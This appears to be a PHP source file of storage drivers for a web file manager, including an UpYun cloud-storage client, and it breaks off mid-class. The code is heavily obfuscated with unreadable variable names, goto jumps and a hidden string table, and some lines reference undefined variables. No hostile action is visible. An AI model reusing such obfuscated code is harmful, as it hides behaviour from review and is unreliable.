<?php
 goto A°’ÚÄ• ­; aíìğÑÇ—: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($“È¹¿øÅ, $ñ‡£¼– = 0) { parent::__construct(); $this->source = $“È¹¿øÅ; $this->sourceSize = $ñ‡£¼–; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ğ­¸ûÔ = false) { return $this->sourceSize; } public function getContent($’°®´¸š = false) { return $this->fileSubstr($’°®´¸š, 0, $this->sourceSize); } public function fileSubstr($î•µ“Å = false, $øëééæ¢ = 0, $ŠŠËìş  = 0) { if (!$ŠŠËìş ) { $ŠŠËìş  = $this->sourceSize; } $ğÚÎ = $this->sourceSize - $øëééæ¢; if ($ŠŠËìş  >= $ğÚÎ) { $ŠŠËìş  = $ğÚÎ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $øëééæ¢, $ŠŠËìş ); } if ($this->sourceType == self::TYPE_FILE) { if ($ŠŠËìş  <= 0) { return $_SERVER[å¸¿•¶£][12]; } $ÎÌ¼° = ftell($this->source); fseek_64($this->source, $ÎÌ¼° + $øëééæ¢); $ƒ²úßµ = @fread($this->source, $ŠŠËìş ); fseek_64($this->source, $ÎÌ¼°); return $ƒ²úßµ; } } public function hashMd5($üÅ©å¨» = false) { return md5($this->getContent()); } public static function hash($µ¥ø‰ÁÊ, $¨Ö†ˆ¸À = 0) { $ÈˆÄÀ = new PathDriverStream($µ¥ø‰ÁÊ, $¨Ö†ˆ¸À); return $ÈˆÄÀ->hashSimple($µ¥ø‰ÁÊ); } public static function md5($‡³ÎÙØ, $ŸÇªåû¤ = 0) { $ÑáË¤àó = new PathDriverStream($‡³ÎÙØ, $ŸÇªåû¤); return $ÑáË¤àó->hashMd5($‡³ÎÙØ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\x2f\57\166\x30\x2e\x61\160\x69\56\x75\160\x79\x75\x6e\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($²ôÃç‚‚) { parent::__construct(); $this->_init($²ôÃç‚‚); } public function _init($úñ¾¨íÖ) { $è¬ãù¤ƒ =& $_SERVER[å¸¿•¶£]; foreach ($úñ¾¨íÖ as $’½•Ò› => $ı‰Ô¦ù‚) { if (isset($this->{$’½•Ò›})) { $this->{$’½•Ò›} = $ı‰Ô¦ù‚; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($è¬ãù¤ƒ[1472] . LNG($è¬ãù¤ƒ[1403])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¥Îá›, $×­É Î = "\107\x45\124") { $¬¸µèëë =& $_SERVER[å¸¿•¶£]; $ÁêÙŸ‡î = gmdate($¬¸µèëë[1436]); $ù¶ñË² = base64_encode(hash_hmac($¬¸µèëë[1473], "{$×­É Î}\46{$¥Îá›}\x26{$ÁêÙŸ‡î}", md5("{$this->userpass}"), !0)); $³ÅˆšÇÛ = array("\x41\x75\x74\150\157\x72\x69\172\141\164\x69\x6f\156\x3a\125\120\x59\x55\x4e\x20{$this->username}\72{$ù¶ñË²}", "\x44\x61\164\x65\x3a{$ÁêÙŸ‡î}"); return $³ÅˆšÇÛ; } public function ussRequest($™åÃ–ö, $Ÿè§å¸â = "\x47\x45\124", $å™Úú«Ò = false, $ÍôÏÊ… = false, $áÔÀ¬Æ = false) { $¶‰•¨Ë =& $_SERVER[å¸¿•¶£]; $™åÃ–ö = trim($™åÃ–ö, $¶‰•¨Ë[8]); $ãÕ“Ñ¾Ñ = "\x2f{$this->bucket}\x2f{$™åÃ–ö}"; $İÃ¼ì“® = $this->ussHeaders($ãÕ“Ñ¾Ñ, $Ÿè§å¸â); if ($ÍôÏÊ…) { $İÃ¼ì“® = array_merge($İÃ¼ì“®, $ÍôÏÊ…); } $ÖİÚ÷·Ä = url_request($this->endpoint . $ãÕ“Ñ¾Ñ, $Ÿè§å¸â, $å™Úú«Ò, $İÃ¼ì“®, $áÔÀ¬Æ); if (!$ÖİÚ÷·Ä) { return array($¶‰•¨Ë[1219] => !1, $¶‰•¨Ë[1209] => $¶‰•¨Ë[1474]); } if (strtolower($Ÿè§å¸â) == $¶‰•¨Ë[197] || in_array($ÖİÚ÷·Ä[$¶‰•¨Ë[1219]], array($¶‰•¨Ë[1329], $¶‰•¨Ë[1475]))) { $å™Úú«Ò = $ÖİÚ÷·Ä[$¶‰•¨Ë[1476]]; } else { $å™Úú«Ò = json_decode($ÖİÚ÷·Ä[$¶‰•¨Ë[1209]], !0); if (!$å™Úú«Ò) { $å™Úú«Ò = $ÖİÚ÷·Ä[$¶‰•¨Ë[1209]]; } else { if (!$ÖİÚ÷·Ä[$¶‰•¨Ë[756]] && isset($å™Úú«Ò[$¶‰•¨Ë[1477]])) { $å™Úú«Ò = $å™Úú«Ò[$¶‰•¨Ë[1477]]; } } } return array($¶‰•¨Ë[1219] => $ÖİÚ÷·Ä[$¶‰•¨Ë[756]], $¶‰•¨Ë[1209] => $å™Úú«Ò); } public function mkfile($Ÿß ÅÜ—, $ºß¦¨¨› = '', $¥­ãâ´› = REPEAT_RENAME) { if ($this->setContent($Ÿß ÅÜ—, $ºß¦¨¨›)) { return $this->getPathOuter($Ÿß ÅÜ—); } return !1; } public function mkdir($µó¯§š, $‚ŸÓı¶ = REPEAT_SKIP) { $‰ú•ÖŠ¤ =& $_SERVER[å¸¿•¶£]; $¢Çì´İÛ = trim($µó¯§š, $‰ú•ÖŠ¤[8]); if ($this->_isFolder($¢Çì´İÛ)) { return $this->getPathOuter($¢Çì´İÛ); } $û©™ñù = array($‰ú•ÖŠ¤[1478]); $æÆø ĞÜ = $this->ussRequest($¢Çì´İÛ, $‰ú•ÖŠ¤[226], !1, $û©™ñù); return $æÆø ĞÜ[$‰ú•ÖŠ¤[1219]] ? $this->getPathOuter($¢Çì´İÛ) : !1; } public function copyFile($¿¾ôœ¬§, $–º˜€š†) { $€ô–Ú¬¤ =& $_SERVER[å¸¿•¶£]; $ Ô¤¹Å = array($€ô–Ú¬¤[1479] . "\x2f{$this->bucket}\57{$¿¾ôœ¬§}", $€ô–Ú¬¤[1480]); $ñßÙâ° = $this->ussRequest($–º˜€š†, $€ô–Ú¬¤[228], !1, $ Ô¤¹Å); return $ñßÙâ°[$€ô–Ú¬¤[1219]] ? !0 : $this->getPathOuter($–º˜€š†); } public function moveFile($¶¶­—‹, $Éüîæ÷´) { $îÊš©¤ø =& $_SERVER[å¸¿•¶£]; $¬€°«íŠ = array($îÊš©¤ø[1481] . "\x2f{$this->bucket}\x2f{$¶¶­—‹}", $îÊš©¤ø[1480]); $›ûœÎ¾µ = $this->ussRequest($Éüîæ÷´, $îÊš©¤ø[228], !1, $¬€°«íŠ); return $›ûœÎ¾µ[$îÊš©¤ø[1219]] ? !0 : $this->getPathOuter($Éüîæ÷´); } public function delFile($©³µæô˜) { $¨ü¬åÌÕ =& $_SERVER[å¸¿•¶£]; $”®€“Õ = $this->ussRequest($©³µæô˜, $¨ü¬åÌÕ[1482]); return $”®€“Õ[$¨ü¬åÌÕ[1219]] ? !0 : !1; } public function delFolder($³ñğšìË) { $¯øÂÁ´Š =& $_SERVER[å¸¿•¶£]; if (!$this->exist($³ñğšìË)) { return !0; } $this->listItemCache = !1; $®€»Õ¨å = $œ ÷ÅúÑ = array(); $this->fileList($³ñğšìË, $®€»Õ¨å, $œ ÷ÅúÑ, !0); $this->listItemCache = !0; foreach ($œ ÷ÅúÑ as $ıè×ÆõÛ) { $µ…´Š¹Ó = $this->ussRequest($ıè×ÆõÛ[$¯øÂÁ´Š[32]], $¯øÂÁ´Š[1482]); if (!$µ…´Š¹Ó[$¯øÂÁ´Š[1219]]) { return !1; } } foreach ($®€»Õ¨å as $¦©ñØÀá) { $µ…´Š¹Ó = $this->ussRequest($¦©ñØÀá, $¯øÂÁ´Š[1482]); if (!$µ…´Š¹Ó[$¯øÂÁ´Š[1219]]) { return !1; } } $µ…´Š¹Ó = $this->ussRequest($³ñğšìË, $¯øÂÁ´Š[1482]); return $µ…´Š¹Ó[$¯øÂÁ´Š[1219]]; } public function rename($Êâ©Ó¹, $Ÿû’àù) { if ($this->isFile($Êâ©Ó¹)) { $Ÿû’àù = get_path_father($Êâ©Ó¹) . $Ÿû’àù; return $this->moveFile($Êâ©Ó¹, $Ÿû’àù); } return $this->renameObject($Êâ©Ó¹, $Ÿû’àù); } public function fileInfo($ñ™ışèä, $è€Üôù¬ = false, $Îµº÷¸Ö = array()) { $£ÅŒµÌğ =& $_SERVER[å¸¿•¶£]; $¯—òÇ—¡ = array($£ÅŒµÌğ[32] => $this->pathThis($ñ™ışèä), $£ÅŒµÌğ[84] => $this->getPathOuter($£ÅŒµÌğ[8] . $ñ™ışèä), $£ÅŒµÌğ[33] => $£ÅŒµÌğ[200], $£ÅŒµÌğ[76] => isset($Îµº÷¸Ö[$£ÅŒµÌğ[76]]) ? $Îµº÷¸Ö[$£ÅŒµÌğ[76]] : 0, $£ÅŒµÌğ[174] => $this->ext($ñ™ışèä)); if ($è€Üôù¬) { return $¯—òÇ—¡; } $¯—òÇ—¡[$£ÅŒµÌğ[201]] = $¯—òÇ—¡[$£ÅŒµÌğ[85]] = 0; $¯—òÇ—¡[$£ÅŒµÌğ[202]] = $¯—òÇ—¡[$£ÅŒµÌğ[203]] = !0; if (empty($Îµº÷¸Ö)) { $Îµº÷¸Ö = $this->objectMeta($ñ™ışèä); if (!$Îµº÷¸Ö) { return $¯—òÇ—¡; } } $¯—òÇ—¡[$£ÅŒµÌğ[201]] = intval($Îµº÷¸Ö[$£ÅŒµÌğ[1483]]); $¯—òÇ—¡[$£ÅŒµÌğ[85]] = intval($Îµº÷¸Ö[$£ÅŒµÌğ[1484]]); $¯—òÇ—¡[$£ÅŒµÌğ[76]] = $Îµº÷¸Ö[$£ÅŒµÌğ[76]]; return $¯—òÇ—¡; } public function folderInfo($»š‹àÜ, $Å ™Á…Ú = false) { $º½¹‚¾İ =& $_SERVER[å¸¿•¶£]; $šê«‚Ú = array($º½¹‚¾İ[32] => $this->pathThis($»š‹àÜ), $º½¹‚¾İ[84] => $this->getPathOuter($º½¹‚¾İ[8] . $»š‹àÜ), $º½¹‚¾İ[33] => $º½¹‚¾İ[75]); if ($Å ™Á…Ú) { return $šê«‚Ú; } $šê«‚Ú[$º½¹‚¾İ[201]] = $šê«‚Ú[$º½¹‚¾İ[85]] = 0; $šê«‚Ú[$º½¹‚¾İ[202]] = $šê«‚Ú[$º½¹‚¾İ[203]] = !0; if (empty($åÖëÎÃ‹)) { $åÖëÎÃ‹ = $this->objectMeta($»š‹àÜ); if (!$åÖëÎÃ‹) { return $šê«‚Ú; } } $šê«‚Ú[$º½¹‚¾İ[201]] = intval($åÖëÎÃ‹[$º½¹‚¾İ[1483]]); $šê«‚Ú[$º½¹‚¾İ[85]] = intval($åÖëÎÃ‹[$º½¹‚¾İ[1484]]); return $šê«‚Ú; } private function listObjs($ß¤‹šÓÎ, $è…Ÿà¥ = 0, $ê®“Ñ¾‚ = 1000) { $ıû±¡º =& $_SERVER[å¸¿•¶£]; $¿è‹¤‹› = array($ıû±¡º[1485], $ıû±¡º[1486] . $ê®“Ñ¾‚); if ($è…Ÿà¥) { $¿è‹¤‹›[] = $ıû±¡º[1487] . $è…Ÿà¥; } $ı¼‰à¢ì = $this->ussRequest($ß¤‹šÓÎ, $ıû±¡º[230], !1, $¿è‹¤‹›); return !$ı¼‰à¢ì[$ıû±¡º[1219]] ? !1 : $ı¼‰à¢ì[$ıû±¡º[1209]]; } private function fileList($¥õÁ™¿‚, &$ìšÖÜö, &$úÉèè—, $‡µ¥„°Ÿ = false) { $Õ”†ãÔ =& $_SERVER[å¸¿•¶£]; $º‹–æƒ© = $Õ”†ãÔ[12]; $Š—ÉØÍÌ = 1000; $À÷µ¦“ï = rtrim($¥õÁ™¿‚, $Õ”†ãÔ[8]) . $Õ”†ãÔ[8]; while (!0) { check_abort(); $Éëã£ = $this->listObjs($¥õÁ™¿‚, $º‹–æƒ©, $Š—ÉØÍÌ); if (!$Éëã£) { return !1; } $º‹–æƒ© = isset($Éëã£[$Õ”†ãÔ[1488]]) ? $Éëã£[$Õ”†ãÔ[1488]] : $Õ”†ãÔ[12]; $³ù³°÷ª = isset($Éëã£[$Õ”†ãÔ[1489]]) ? $Éëã£[$Õ”†ãÔ[1489]] : array(); foreach ($³ù³°÷ª as $ˆøè÷®) { $ñ‰â‘Í = $ˆøè÷®[$Õ”†ãÔ[33]] == $Õ”†ãÔ[75] ? !0 : !1; $Í„Ô‰ü„ = ltrim($À÷µ¦“ï . $ˆøè÷®[$Õ”†ãÔ[32]], $Õ”†ãÔ[8]) . ($ñ‰â‘Í ? $Õ”†ãÔ[8] : $Õ”†ãÔ[12]); $½Ïâ±¶ = array($Õ”†ãÔ[32] => $Í„Ô‰ü„, $Õ”†ãÔ[33] => $ñ‰â‘Í ? $Õ”†ãÔ[75] : $Õ”†ãÔ[200], $Õ”†ãÔ[76] => $ˆøè÷®[$Õ”†ãÔ[337]], $Õ”†ãÔ[1484] => $ˆøè÷®[$Õ”†ãÔ[1490]]); $this->cacheMethodInfoSet($Í„Ô‰ü„, $ñ‰â‘Í, $½Ïâ±¶); if ($ñ‰â‘Í) { $ìšÖÜö[] = $Í„Ô‰ü„; if ($‡µ¥„°Ÿ) { $this->fileList($Í„Ô‰ü„, $ìšÖÜö, $úÉèè—, $‡µ¥„°Ÿ); } continue; } $úÉèè—[] = $½Ïâ±¶; } if (count($³ù³°÷ª) < $Š—ÉØÍÌ) { break; } } $this->cacheMethodInfoSet($¥õÁ™¿‚, !0); } public function listPath($› àê´…, $úàã¤ = false) { $óÊÑëŠƒ =& $_SERVER[å¸¿•¶£]; $¤êğş = $„•Úç½ = array(); $this->fileList($› àê´…, $¤êğş, $„•Úç½); foreach ($¤êğş as $å³ÍÔı => $÷ÉÄ“œ) { $¤êğş[$å³ÍÔı] = $this->folderInfo($÷ÉÄ“œ, $úàã¤); } foreach ($„•Úç½ as $å³ÍÔı => $÷ÉÄ“œ) { $„•Úç½[$å³ÍÔı] = $this->fileInfo($÷ÉÄ“œ[$óÊÑëŠƒ[32]], $úàã¤, $÷ÉÄ“œ); } return array($óÊÑëŠƒ[82] => $¤êğş, $óÊÑëŠƒ[83] => $„•Úç½); } public function has($ˆÍÇ•âœ, $îƒÙÅù = false, $´—ê¤¡ = true) { $ƒìæ²ñ =& $_SERVER[å¸¿•¶£]; $ø³ôò¶ä = $ƒìæ²ñ[12]; $ñŒ£ÒãÏ = 500; $Ñ½‹ò™» = 0; $º§·êë = 0; $±Ï‚œ¯´ = rtrim($ˆÍÇ•âœ, $ƒìæ²ñ[8]) . $ƒìæ²ñ[8]; while (!0) { check_abort(); $Ÿ“ÂÛ¡Î = $this->listObjs($ˆÍÇ•âœ, $ø³ôò¶ä, $ñŒ£ÒãÏ); if (!$Ÿ“ÂÛ¡Î) { return !1; } $ø³ôò¶ä = isset($Ÿ“ÂÛ¡Î[$ƒìæ²ñ[1488]]) ? $Ÿ“ÂÛ¡Î[$ƒìæ²ñ[1488]] : $ƒìæ²ñ[12]; $†åê³Àš = isset($Ÿ“ÂÛ¡Î[$ƒìæ²ñ[1489]]) ? $Ÿ“ÂÛ¡Î[$ƒìæ²ñ[1489]] : array(); if (empty($†åê³Àš)) { break; } $¾ôµõÑ = array_filter($†åê³Àš, function ($›¼¯±Åæ) { $² ¨ˆ ¼ =& $_SERVER[å¸¿•¶£]; return $›¼¯±Åæ[$² ¨ˆ ¼[33]] == $² ¨ˆ ¼[75]; }); $Åú…­”‚ = count($†åê³Àš); $¾ôµõÑ = count($¾ôµõÑ); $–®Í—Ä = $Åú…­”‚ - $¾ôµõÑ; if ($îƒÙÅù) { $º§·êë += $¾ôµõÑ; $Ñ½‹ò™» += $–®Í—Ä; if ($Åú…­”‚ < $ñŒ£ÒãÏ) { break; } continue; } if ($´—ê¤¡) { if ($–®Í—Ä) { return !0; } } else { if ($¾ôµõÑ) { return !0; } } if ($Åú…­”‚ < $ñŒ£ÒãÏ) { break; } } if ($îƒÙÅù) { return array($ƒìæ²ñ[207] => $Ñ½‹ò™», $ƒìæ²ñ[208] => $º§·êë); } return !1; } public function listAll($æˆãèŞ–) { $ÜÅ÷Ã°“ =& $_SERVER[å¸¿•¶£]; $òÌ¥±ä = $ÓèÓÌëë = array(); $this->fileList($æˆãèŞ–, $òÌ¥±ä, $ÓèÓÌëë, !0); $ÒÁ†‚ûå = array_to_keyvalue($ÓèÓÌëë, $ÜÅ÷Ã°“[32]); foreach ($òÌ¥±ä as $ò¢ÊŸ³) { if (is_string($ò¢ÊŸ³)) { $ÒÁ†‚ûå[$ò¢ÊŸ³] = array($ÜÅ÷Ã°“[76] => 0); } } return $this->listAllFiles($æˆãèŞ–, $ÒÁ†‚ûå); } public function canRead($“Ó…Ïã) { return $this->exist($“Ó…Ïã) ? !0 : !1; } public function canWrite($»·í‘¨Å) { return $this->exist($»·í‘¨Å) ? !0 : !1; } public function getContent($Û›½¤¹Ø) { return $this->fileSubstr($Û›½¤¹Ø, 0, -1); } public function setContent($Ó‰úäÉ’, $’††­ÃÎ = '') { $ËÇÈÇ¾ô =& $_SERVER[å¸¿•¶£]; if (!$’††­ÃÎ) { $øúŞÖ = $this->ussRequest($Ó‰úäÉ’, $ËÇÈÇ¾ô[226]); return $øúŞÖ[$ËÇÈÇ¾ô[1219]]; } $…Ï®§² = $this->tempFile($this->pathThis($Ó‰úäÉ’)); file_put_contents($…Ï®§², $’††­ÃÎ); if ($this->upload($Ó‰úäÉ’, $…Ï®§²)) { $this->tempFileRemve($…Ï®§²); return !0; } return !1; } public function fileSubstr($óîˆÔªµ, $Äà—Çöá, $½­¢Û€) { $”Óâïùâ =& $_SERVER[å¸¿•¶£]; if (!($øòş°›¤ = $this->link($óîˆÔªµ))) { return !1; } $¥¨ìú˜› = !1; if ($½­¢Û€ > 0) { $ı ¸õ‹Á = $Äà—Çöá + $½­¢Û€ - 1; $¥¨ìú˜› = array($”Óâïùâ[1451] . $Äà—Çöá . $”Óâïùâ[386] . $ı ¸õ‹Á); } $‹ğÉš› = url_request($øòş°›¤, $”Óâïùâ[230], !1, $¥¨ìú˜›); return $‹ğÉš›[$”Óâïùâ[756]] ? $‹ğÉš›[$”Óâïùâ[1209]] : !1; } public function upload($·õ°£¡ƒ, $Ïí§»²Ô, $¸Ûè‡î… = false, $†›Ö²ı = REPEAT_REPLACE) { $±ä›Ş¯Ò =& $_SERVER[å¸¿•¶£]; $®÷ö¥£Ä = IO::size($Ïí§»²Ô); if ($®÷ö¥£Ä <= 1024 * 1024 * 200) { $•Ñ‘°ôŞ = array($±ä›Ş¯Ò[1491] . $Ïí§»²Ô); $¶ï¨Í©Ó = $this->ussRequest($·õ°£¡ƒ, $±ä›Ş¯Ò[228], $•Ñ‘°ôŞ); return $¶ï¨Í©Ó[$±ä›Ş¯Ò[1219]] ? $this->getPathOuter($·õ°£¡ƒ) : !1; } $óİ«±Õ = 1024 * 1024 * 10; $ÕŸÏÜ = array($±ä›Ş¯Ò[1492], $±ä›Ş¯Ò[1493] . $®÷ö¥£Ä, $±ä›Ş¯Ò[1494], $±ä›Ş¯Ò[1495] . $óİ«±Õ); $¶ï¨Í©Ó = $this->ussRequest($·õ°£¡ƒ, $±ä›Ş¯Ò[228], !1, $ÕŸÏÜ); if (!$¶ï¨Í©Ó[$±ä›Ş¯Ò[1219]]) { return !1; } $ßª‡œ•û = $¶ï¨Í©Ó[$±ä›Ş¯Ò[1209]]; $£±¾ÅÈƒ = 0; $Íšçà»¨ = $ßª‡œ•û[$±ä›Ş¯Ò[1496]]; $€ºÅë›‘ = fopen($Ïí§»²Ô, $±ä›Ş¯Ò[1400]); if (!$€ºÅë›‘) { return !1; } do { $¯À½÷ = $ßª‡œ•û[$±ä›Ş¯Ò[1497]]; fseek_64($€ºÅë›‘, $£±¾ÅÈƒ); $²ø·íÕ´ = fread($€ºÅë›‘, $¯À½÷); $ØöáÛäÑ = 0; do { $ØöáÛäÑ++; $ßª‡œ•û = $this->uploadPart($·õ°£¡ƒ, $ßª‡œ•û, $²ø·íÕ´); } while (!$ßª‡œ•û && $ØöáÛäÑ < 3); if (!$ßª‡œ•û) { return !1; } $Íšçà»¨ = $ßª‡œ•û[$±ä›Ş¯Ò[1496]]; $£±¾ÅÈƒ += $¯À½÷; } while ($Íšçà»¨ != -1); fclose($€ºÅë›‘); $ÕŸÏÜ = array($±ä›Ş¯Ò[1498], $±ä›Ş¯Ò[1499] . $ßª‡œ•û[$±ä›Ş¯Ò[1500]], $±ä›Ş¯Ò[1494]); $¶ï¨Í©Ó = $this->ussRequest($·õ°£¡ƒ, $±ä›Ş¯Ò[228], !1, $ÕŸÏÜ); return $¶ï¨Í©Ó[$±ä›Ş¯Ò[1219]] ? $this->getPathOuter($†™îØé‹) : !1; } private function uploadPart($õşÕ£ˆÓ, $œŸÂ¯§€, &$Œş¦×Á×) { $İ®¯×« =& $_SERVER[å¸¿•¶£]; $¸éŒŒ²¨ = array($İ®¯×«[1501], $İ®¯×«[1499] . $œŸÂ¯§€[$İ®¯×«[1500]], $İ®¯×«[1502] . $œŸÂ¯§€[$İ®¯×«[1496]], $İ®¯×«[142] . $œŸÂ¯§€[$İ®¯×«[1497]]); $ª¯’Öå¿ = $this->ussRequest($õşÕ£ˆÓ, $İ®¯×«[228], $Œş¦×Á×, $¸éŒŒ²¨); return !$ª¯’Öå¿[$İ®¯×«[1219]] ? $ª¯’Öå¿[$İ®¯×«[1219]] : $ª¯’Öå¿[$İ®¯×«[1209]]; } public function uploadFormData($ëÎ‚º, $‚‰™ãÁŞ = 3600) { return $this->uploadPolicy($ëÎ‚º, $‚‰™ãÁŞ); } public function multiUploadFormData($«ÁîŒ² , $†ò¼®ûœ = 3600) { $Ç™—‘©š =& $_SERVER[å¸¿•¶£]; $”—ñ‡ Ñ = (int) $GLOBALS[$Ç™—‘©š[7]][$Ç™—‘©š[76]]; return $this->uploadPolicy($«ÁîŒ² , $†ò¼®ûœ, $”—ñ‡ Ñ); } private function uploadPolicy($ë¨Ø¿ÀŸ, $¥Ş…˜´Ÿ = 3600, $ŸëÎüŞ = 0) { $ıãÁêØó =& $_SERVER[å¸¿•¶£]; $ğ´©ÅåÓ = $ıãÁêØó[8] . $this->bucket; $Ğ¤Âû = gmdate($ıãÁêØó[1436]); $Õãæ¿Ûã = array($ıãÁêØó[1503] => $this->bucket, $ıãÁêØó[1504] => $ë¨Ø¿ÀŸ, $ıãÁêØó[1505] => time() + $¥Ş…˜´Ÿ, $ıãÁêØó[1506] => $Ğ¤Âû); if ($ŸëÎüŞ) { $Õãæ¿Ûã[$ıãÁêØó[1416]] = $ŸëÎüŞ; } $¸í¬ûõã = base64_encode(json_encode($Õãæ¿Ûã)); $¢¢ş¬Ô‰ = base64_encode(hash_hmac($ıãÁêØó[1473], "\120\x4f\x53\x54\x26{$ğ´©ÅåÓ}\x26{$Ğ¤Âû}\x26{$¸í¬ûõã}", md5("{$this->userpass}"), !0)); $Ñ”¿‘Ø = array($ıãÁêØó[1341] => $¸í¬ûõã, $ıãÁêØó[1507] => "\x55\120\x59\125\x4e\x20{$this->username}\x3a{$¢¢ş¬Ô‰}", $ıãÁêØó[182] => $this->endpoint . $ğ´©ÅåÓ); return $Ñ”¿‘Ø; } public function download($ş‘ï€Ê, $À¹¦Çİˆ) { $ÈõåÅÕ€ = IO::getPathInner(IO::mkfile($À¹¦Çİˆ)); if (!($ŸğÖÏª = $this->link($ş‘ï€Ê))) { return !1; } $úµğ†Êë = 0; $ ’ÎÈß = 1024 * 200; $ùÖÚ›•ˆ = fopen($ÈõåÅÕ€, $_SERVER[å¸¿•¶£][1457]); while (!0) { $¯ÊñßÈÀ = $this->fileSubstr($ş‘ï€Ê, $úµğ†Êë, $ ’ÎÈß); if ($¯ÊñßÈÀ === !1) { return !1; } fwrite($ùÖÚ›•ˆ, $¯ÊñßÈÀ); $úµğ†Êë += $ ’ÎÈß; if (strlen($¯ÊñßÈÀ) < $ ’ÎÈß) { break; } } fclose($ùÖÚ›•ˆ); return $À¹¦Çİˆ; } public function link($¦ ÏÛŸÚ, $üØŠ³ü± = array()) { $Î÷ì¸ÕÚ =& $_SERVER[å¸¿•¶£]; $¦ ÏÛŸÚ = trim($¦ ÏÛŸÚ, $Î÷ì¸ÕÚ[8]); if (!empty($this->token)) { $ƒğèïƒï = strtotime(date($Î÷ì¸ÕÚ[1508])); $“€»ë§Ğ = substr(md5($this->token . $Î÷ì¸ÕÚ[284] . $ƒğèïƒï . $Î÷ì¸ÕÚ[1509] . $¦ ÏÛŸÚ), 12, 8) . $ƒğèïƒï; $üØŠ³ü±[] = $Î÷ì¸ÕÚ[1510] . $“€»ë§Ğ; } $ß©–á³µ = !empty($üØŠ³ü±) ? $Î÷ì¸ÕÚ[73] . implode($Î÷ì¸ÕÚ[284], $üØŠ³ü±) : $Î÷ì¸ÕÚ[12]; return $this->getHost() . $Î÷ì¸ÕÚ[8] . $¦ ÏÛŸÚ . $ß©–á³µ; } public function fileOut($¢èğçŸ, $‚ş²ƒÑõ = false, $¤„±Ü— = false, $ÀëâŠ”» = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¢èğçŸ, $‚ş²ƒÑõ, $¤„±Ü—, $ÀëâŠ”»); } if (!$¤„±Ü—) { $¤„±Ü— = $this->pathThis($¢èğçŸ); } $¿Â“ûÎ¼ = $‚ş²ƒÑõ ? array($_SERVER[å¸¿•¶£][1511] . rawurlencode($¤„±Ü—)) : array(); $ë£Ì = $this->link($¢èğçŸ, $¿Â“ûÎ¼); $this->fileOutLink($ë£Ì); } public function fileOutServer($†ÇÓÙøä, $¤¤ş¯ï = false, $ˆÈ¦Ù¡Æ = false, $‚áÔ±„¥ = '') { parent::fileOut($†ÇÓÙøä, $¤¤ş¯ï, $ˆÈ¦Ù¡Æ, $‚áÔ±„¥); } public function fileOutImage($ÒÁ§¯²í, $´Ã®´Ğñ = 250) { $Ê…ÕêÆé = $this->link($ÒÁ§¯²í . $_SERVER[å¸¿•¶£][1512] . $´Ã®´Ğñ); $this->fileOutLink($Ê…ÕêÆé); } public function fileOutImageServer($ë¤Ï¾è€, $§ˆéŸ¬Ü = 250) { parent::fileOutImage($ë¤Ï¾è€, $§ˆéŸ¬Ü); } public function hashMd5($‡ÚÒƒ) { $€ú»Äœ¨ =& $_SERVER[å¸¿•¶£]; $ùËıÛ€ = $this->_objectMeta($‡ÚÒƒ); return isset($ùËıÛ€[$€ú»Äœ¨[212]]) ? $ùËıÛ€[$€ú»Äœ¨[212]] : !1; } public function size($ªÚŞ»Û») { $Ş‹øÂœå = $this->objectMeta($ªÚŞ»Û»); return $Ş‹øÂœå ? $Ş‹øÂœå[$_SERVER[å¸¿•¶£][76]] : 0; } public function info($Ó”ä„‘´) { if ($this->isFolder($Ó”ä„‘´)) { return $this->folderInfo($Ó”ä„‘´); } else { if ($this->isFile($Ó”ä„‘´)) { return $this->fileInfo($Ó”ä„‘´); } } return !1; } public function exist($³Éé¢¸) { return $this->isFile($³Éé¢¸) || $this->isFolder($³Éé¢¸); } public function isFile($×Ê‚œ­ã) { return !$this->isFolder($×Ê‚œ­ã) && $this->objectMeta($×Ê‚œ­ã); } public function isFolder($íœ‡Œ¦ò) { return $this->cacheMethod($_SERVER[å¸¿•¶£][165], $íœ‡Œ¦ò); } protected function objectMeta($¦ÊŒ÷³) { return $this->cacheMethod($_SERVER[å¸¿•¶£][167], $¦ÊŒ÷³); } protected function _objectMeta($²¨ŞÅ®Ñ) { $­é»××´ =& $_SERVER[å¸¿•¶£]; if ($²¨ŞÅ®Ñ == $­é»××´[12] || $²¨ŞÅ®Ñ == $­é»××´[8]) { return array(); } $Ğ—¤¹›è = $this->ussRequest($²¨ŞÅ®Ñ, $­é»××´[1513]); if (!$Ğ—¤¹›è[$­é»××´[1219]]) { return null; } $®Ëó÷é€ = isset($Ğ—¤¹›è[$­é»××´[1209]]) ? $Ğ—¤¹›è[$­é»××´[1209]] : array(); if (!isset($®Ëó÷é€[$­é»××´[1514]])) { return null; } $ïı•¢°Ä = array($­é»××´[33] => isset($®Ëó÷é€[$­é»××´[1514]]) ? $®Ëó÷é€[$­é»××´[1514]] : null, $­é»××´[76] => isset($®Ëó÷é€[$­é»××´[1515]]) ? $®Ëó÷é€[$­é»××´[1515]] : null, $­é»××´[212] => isset($®Ëó÷é€[$­é»××´[1516]]) ? $®Ëó÷é€[$­é»××´[1516]] : null, $­é»××´[1483] => isset($®Ëó÷é€[$­é»××´[1517]]) ? $®Ëó÷é€[$­é»××´[1517]] : null); $ïı•¢°Ä[$­é»××´[1484]] = isset($®Ëó÷é€[$­é»××´[1518]]) ? strtotime($®Ëó÷é€[$­é»××´[1518]]) : $ïı•¢°Ä[$­é»××´[1483]]; return $ïı•¢°Ä; } protected function _isFolder($Å„î‘¯„) { $Š¯³„î =& $_SERVER[å¸¿•¶£]; if ($Å„î‘¯„ == $Š¯³„î[12] || $Å„î‘¯„ == $Š¯³„î[8]) { return !0; } $ÊùáØ¬ = $this->_objectMeta($Å„î‘¯„); return isset($ÊùáØ¬[$Š¯³„î[33]]) && $ÊùáØ¬[$Š¯³„î[33]] == $Š¯³„î[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($‹ËÃƒçÂ = false) { } public function exist($¾Œéº–©) 